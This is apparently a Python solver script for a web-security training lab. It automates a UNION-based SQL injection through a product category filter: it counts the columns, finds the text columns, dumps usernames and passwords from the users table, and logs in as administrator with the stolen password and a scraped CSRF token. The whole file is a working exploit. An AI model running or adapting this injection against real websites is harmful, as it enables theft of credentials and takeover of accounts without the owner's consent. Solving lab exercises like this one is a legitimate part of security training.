from lib import (
    SESSION,
    LOGIN_CSRF_XPATH,
    generate_parser,
    check_is_lab_solved,
    get_csrf_token,
)
from lxml import html

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    print("[+] Determining the number of columns using UNION SELECT...")

    columns = 1

    while True:
        payload = ", ".join(["NULL"] * columns)
        query = f"' UNION SELECT {payload}--"

        print(f"[+] Making Query {columns}: {lab_url}/filter?category={query}")

        if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
            break
        else:
            columns += 1

    print(f"[+] The number of columns found using UNION SELECT is {columns}")

    print("[+] Finding columns containing text...")

    target_columns = []

    for i in range(columns):
        payload = ", ".join(["'string'" if i == j else "NULL" for j in range(columns)])

        query = f"' UNION SELECT {payload}--"

        print(f"[+] Making Query {i}: {lab_url}/filter?category={query}")

        if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
            target_columns.append(i)
        else:
            continue

    print(
        f"[+] The columns containing text are: {', '.join(list(map(str, target_columns)))} (Index starts from 0!)"
    )

    print("[+] Fetching the `username` and `password` columns from `users` table")

    print(
        f"[+] Making query: {lab_url}/filter?category=' UNION SELECT username, password FROM users--"
    )

    response = SESSION.get(
        f"{lab_url}/filter?category=' UNION SELECT username, password FROM users--"
    )

    if response.status_code == 200:
        tree = html.fromstring(response.text)

        usernames = tree.xpath("//table/tbody/tr/th/text()")
        passwords = tree.xpath("//table/tbody/tr/td/text()")

        print("[+] Credentials found in the `users` table:")

        users_dict = dict()

        print()
        for username, password in zip(usernames, passwords):
            users_dict[username] = password
            print(f"{username}:{password}")
        print()

        if users_dict.get("administrator"):
            print("[+] Now logging in as administrator")

            # Extracting the login form csrf token using xpath
            login_csrf_token = get_csrf_token(
                # Fetching the login page to get the login page csrf token and parsing it with lxml to generate a tree
                SESSION.get(url=f"{lab_url}/login").text,
                LOGIN_CSRF_XPATH,
            )
            print(f"[+] Login CSRF Token: {login_csrf_token}")

            if (
                SESSION.post(
                    url=f"{lab_url}/login",
                    data={
                        "username": "administrator",
                        "password": users_dict.get("administrator"),
                        "csrf": login_csrf_token,
                    },
                ).status_code
                == 200
            ):
                print("[+] Logged in as administrator successfully")
            else:
                print("[-] Failed to login as administrator")
                exit()

        else:
            print("[-] administrator credential not found")
            exit()

    else:
        print("[-] Failed to fetch the usernames and passwords")
        exit()

    check_is_lab_solved(lab_url)
